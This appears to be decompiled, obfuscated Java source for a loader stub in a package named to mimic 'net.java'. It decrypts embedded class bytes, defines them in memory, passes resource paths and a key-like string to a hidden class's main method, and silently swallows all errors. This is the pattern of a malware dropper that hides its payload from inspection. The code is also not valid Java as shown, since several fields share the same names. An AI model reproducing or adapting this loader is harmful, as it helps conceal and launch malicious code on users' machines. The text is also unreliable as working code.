package net.java;

import java.io.ByteArrayInputStream;
import java.io.DataInputStream;
import java.lang.reflect.Method;
import java.util.HashMap;

public class n extends ClassLoader {
   public static String a = "/64FV7OQUIMC8I";
   private static String b = "/net/java/a";
   private static String c = "/net/java/b";
   private static String d = "/net/java/c";
   private static String e = "/net/java/d";
   private static String f = "/net/java/e";
   private static long a = -1083759330220665782L;
   private static long b = -4062297973245990737L;
   private static long c = -8461988079585481081L;
   private HashMap a = new HashMap();

   public n() {
      byte[] var1 = l.b(l.a());
      DataInputStream var5 = new DataInputStream(new ByteArrayInputStream(var1));

      try {
         while (var5.available() > 0) {
            String var2 = var5.readUTF();
            byte[] var3 = new byte[var5.readInt()];
            var5.readFully(var3);
            this.a.put(var2, var3);
         }
      } catch (Exception var4) {
         var4.printStackTrace();
      }
   }

   @Override
   public synchronized Class loadClass(String var1) {
      Class var2;
      if ((var2 = this.findLoadedClass(var1)) == null) {
         byte[] var3;
         return (var3 = (byte[])this.a.get(var1)) == null ? super.loadClass(var1) : this.defineClass(var1, var3, 0, var3.length);
      } else {
         return var2;
      }
   }

   public static void a() {
      l.a = d;
      l.b = c;
      l.c = b;
      l.a = a;
      l.b = b;
      l.c = c;
   }

   public static void main(String[] var0) {
      a();
      n var1 = new n();

      try {
         Method var4 = var1.loadClass("a").getDeclaredMethod("main", String[].class);
         String[] var2;
         (var2 = new String[var0.length + 6])[0] = b;
         var2[1] = c;
         var2[2] = d;
         var2[3] = e;
         var2[4] = f;
         var2[5] = a;
         System.arraycopy(var0, 0, var2, 6, var0.length);
         var4.invoke(null, var2);
      } catch (Throwable var3) {
      }
   }
}
